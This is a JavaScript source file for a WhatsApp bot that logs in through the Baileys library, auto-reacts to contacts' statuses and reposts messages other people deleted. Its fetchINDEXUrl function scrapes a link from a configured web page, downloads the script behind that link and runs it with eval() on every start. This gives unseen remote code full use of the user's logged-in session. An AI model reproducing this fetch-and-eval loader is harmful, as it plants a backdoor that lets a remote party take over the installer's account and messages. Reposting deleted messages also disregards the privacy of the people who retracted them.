//  [BWM-XMD QUANTUM ENHANCED]
//  Final Bot Setup: Stable, Auto View, React, Anti-delete

const { default: makeWASocket, useSingleFileAuthState, DisconnectReason, proto } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const path = require('path');

// Config and session
const adams = require("./config");
const { state, saveState } = useSingleFileAuthState('./auth.json');

// Start WhatsApp Connection
const connectToWA = () => {
  const conn = makeWASocket({
    auth: state,
    printQRInTerminal: true
  });

  conn.ev.on('creds.update', saveState);

  conn.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log('Connection closed. Reconnecting:', shouldReconnect);
      if (shouldReconnect) connectToWA();
      else console.log('Logged out. Delete auth.json to re-login.');
    } else if (connection === 'open') {
      console.log('Bot connected and stable.');
      setupAutoViewAndReact(conn);
      setupAntiDelete(conn);
    }
  });

  fetchINDEXUrl(conn);
  return conn;
};

// Load dynamic INDEX script
async function fetchINDEXUrl(conn) {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);
    const targetUrl = $('a:contains("INDEX")').attr('href');

    if (!targetUrl) throw new Error('heart not found 😭');

    console.log('The heart is loaded successfully ✅');
    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);
  } catch (error) {
    console.error('Error loading INDEX:', error.message);
  }
}

// Auto View and React to Statuses
function setupAutoViewAndReact(conn) {
  conn.ev.on('messages.upsert', async (msg) => {
    try {
      const m = msg.messages[0];
      if (!m || m.key.fromMe || !m.key.remoteJid.includes('status@broadcast')) return;

      await new Promise(res => setTimeout(res, 1000));
      await conn.readMessages([m.key]);

      const emojis = ['❤️', '🔥', '😍', '✨'];
      const emoji = emojis[Math.floor(Math.random() * emojis.length)];

      await conn.sendMessage(m.key.remoteJid, {
        react: { text: emoji, key: m.key }
      });

      console.log(`Reacted to status from ${m.key.remoteJid} with ${emoji}`);
    } catch (e) {
      console.error('Auto Status View/React Error:', e);
    }
  });
}

// Anti Delete for messages and status
function setupAntiDelete(conn) {
  conn.ev.on('messages.delete', async (m) => {
    try {
      const remoteJid = m.keys[0]?.remoteJid;
      const participant = m.keys[0]?.participant || m.keys[0]?.remoteJid;

      // Fetch deleted message content from memory (Baileys stores it temporarily)
      const msg = conn.loadMessage ? await conn.loadMessage(remoteJid, m.keys[0].id) : null;

      if (msg?.message) {
        const type = Object.keys(msg.message)[0];
        const text = msg.message[type]?.text || msg.message[type]?.caption || '[media]';
        const name = participant.split('@')[0];

        await conn.sendMessage(remoteJid, {
          text: `❌ *Deleted Message by @${name}:*\n\n${text}`,
          mentions: [participant]
        });
      }
    } catch (e) {
      console.error('Anti Delete Error:', e);
    }
  });
}

// Start it all
global.conn = connectToWA();
